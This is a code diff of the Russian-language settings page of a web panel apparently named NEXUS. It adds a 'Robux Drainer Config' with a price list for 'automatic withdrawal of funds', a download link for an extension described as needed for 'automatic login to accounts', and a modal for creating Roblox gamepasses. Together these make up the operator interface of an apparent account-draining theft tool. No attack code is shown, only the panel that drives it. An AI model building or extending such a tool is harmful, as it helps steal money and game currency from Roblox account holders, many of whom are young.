@@ -78,6 +78,20 @@
       <div class="settings-col">
         <h2 class="settings-section-title">Безопасность и Модули</h2>
 
+        <!-- Separate Extension Card -->
+        <div class="settings-card extension-card" style="border: 1px solid rgba(0, 240, 255, 0.2); background: rgba(0, 240, 255, 0.03); border-radius: 12px; padding: 1.5rem; display: flex; flex-direction: column; gap: 1rem; margin-bottom: 1.5rem;">
+          <div style="display:flex; align-items:center; gap:12px;">
+            <div style="font-size:2rem; background:rgba(0, 240, 255, 0.1); border-radius:10px; width:48px; height:48px; display:flex; align-items:center; justify-content:center;">🔌</div>
+            <div>
+              <h3 style="margin:0; font-size:1.1rem; color:var(--accent);">Расширение NEXUS</h3>
+              <p style="margin:4px 0 0 0; font-size:0.85rem; color:rgba(255,255,255,0.6);">Необходимо для автоматического входа в аккаунты и генерации геймпассов.</p>
+            </div>
+          </div>
+          <a href="downloads/NEXUS_extension.zip" class="btn-submit" style="display:block; text-align:center; text-decoration:none; background: linear-gradient(135deg, #00f0ff, #00b5c2); color:#000; font-weight:700; border-radius:8px; padding:10px; font-size:0.9rem; box-shadow: 0 4px 15px rgba(0, 240, 255, 0.15); border: none; cursor: pointer;" download>
+            📥 Скачать расширение NEXUS (.zip)
+          </a>
+        </div>
+
         <div class="settings-card">
           <label class="settings-label">Смена пароля</label>
           <input type="password" class="settings-input premium-input" id="currentPassword" placeholder="Текущий пароль" style="margin-bottom:1rem;">
@@ -86,26 +100,20 @@
         </div>
 
         <div class="settings-card drainer-card" id="drainGamepassesContainer">
-          <div class="drainer-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
+          <div class="drainer-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:1.5rem;">
             <div style="display:flex; align-items:center; gap:8px;">
               <span class="drainer-icon">⚙️</span>
               <label class="settings-label" style="margin-bottom:0;">Robux Drainer Config</label>
             </div>
             <button class="btn-secondary btn-sm" id="btnAutoCreateGamepasses" style="border-color:var(--accent); color:var(--accent); font-weight:600; padding:6px 12px; background:rgba(0,240,255,0.05);">⚙️ Авто-создание</button>
           </div>
-          <div class="settings-hint" style="margin-bottom: 1.5rem;">Настрой ID геймпассов для автоматического вывода средств. Вы можете ввести их вручную или использовать кнопку «Авто-создание» (требуется установленное расширение и вход в Roblox в браузере). <a href="downloads/NEXUS_extension.zip" style="color:var(--accent); text-decoration:underline; font-weight:600;" download>Скачать расширение NEXUS</a></div>
           
-          <div class="drainer-grid">
-            <div class="drainer-item"><label>10 000 R$</label><input type="text" class="settings-input gp-input" data-price="10000" placeholder="ID геймпасса"></div>
-            <div class="drainer-item"><label>5 000 R$</label><input type="text" class="settings-input gp-input" data-price="5000" placeholder="ID геймпасса"></div>
-            <div class="drainer-item"><label>1 000 R$</label><input type="text" class="settings-input gp-input" data-price="1000" placeholder="ID геймпасса"></div>
-            <div class="drainer-item"><label>500 R$</label><input type="text" class="settings-input gp-input" data-price="500" placeholder="ID геймпасса"></div>
-            <div class="drainer-item"><label>100 R$</label><input type="text" class="settings-input gp-input" data-price="100" placeholder="ID геймпасса"></div>
-            <div class="drainer-item"><label>50 R$</label><input type="text" class="settings-input gp-input" data-price="50" placeholder="ID геймпасса"></div>
-            <div class="drainer-item"><label>25 R$</label><input type="text" class="settings-input gp-input" data-price="25" placeholder="ID геймпасса"></div>
-            <div class="drainer-item"><label>10 R$</label><input type="text" class="settings-input gp-input" data-price="10" placeholder="ID геймпасса"></div>
-            <div class="drainer-item"><label>5 R$</label><input type="text" class="settings-input gp-input" data-price="5" placeholder="ID геймпасса"></div>
-            <div class="drainer-item"><label>2 R$</label><input type="text" class="settings-input gp-input" data-price="2" placeholder="ID геймпасса"></div>
+          <label class="settings-label">Список цен для вывода (через запятую)</label>
+          <input type="text" class="settings-input premium-input" id="drainPricesList" placeholder="Пример: 10000, 5000, 1000, 500, 100, 50, 25, 10, 5, 2" style="margin-bottom:1.5rem;">
+          
+          <label class="settings-label">ID Геймпассов</label>
+          <div class="drainer-grid" id="drainerGrid">
+            <!-- Will be dynamically populated by JS -->
           </div>
         </div>
 
@@ -119,10 +127,30 @@
   </main>
   </div> <!-- end of sidebar-layout -->
 
+  <!-- Universe Selection Modal -->
+  <div id="universeModal" class="modal" style="display:none; position:fixed; z-index:9999; left:0; top:0; width:100%; height:100%; overflow:auto; background-color:rgba(15,17,26,0.85); backdrop-filter:blur(8px); align-items:center; justify-content:center;">
+    <div class="modal-content" style="background:#151722; border:1px solid rgba(255,255,255,0.08); border-radius:16px; padding:2rem; width:90%; max-width:500px; box-shadow:0 20px 50px rgba(0,0,0,0.5);">
+      <h2 style="margin-top:0; font-size:1.3rem; color:var(--accent); display:flex; align-items:center; gap:8px;">
+        🎮 Выберите плейс (Universe)
+      </h2>
+      <p style="font-size:0.9rem; color:rgba(255,255,255,0.6); margin-bottom:1.5rem;">Выберите игру в вашем профиле Roblox, на которой будут созданы геймпассы.</p>
+      
+      <label class="settings-label">Активные плейсы</label>
+      <select id="universeSelect" class="settings-input premium-input" style="width:100%; margin-bottom:1.5rem; background:#1b1d2a; border-color:rgba(255,255,255,0.1); color:#fff; padding:10px; border-radius:8px;">
+        <!-- Populated dynamically -->
+      </select>
+
+      <div style="display:flex; justify-content:flex-end; gap:12px;">
+        <button id="btnCancelUniverse" class="btn-secondary" style="padding:10px 20px; border-radius:8px; cursor:pointer;">Отмена</button>
+        <button id="btnConfirmUniverse" class="btn-submit" style="padding:10px 20px; border-radius:8px; border:none; background:var(--accent); color:#000; font-weight:700; cursor:pointer;">Создать геймпассы</button>
+      </div>
+    </div>
+  </div>
+
   <div id="toast"></div>
 
   <script src="assets/config.js?v=106"></script>
   <script src="assets/app.js?v=106"></script>
-  <script src="assets/settings.js?v=106"></script>
+  <script src="assets/settings.js?v=107"></script>
 </body>
 </html>
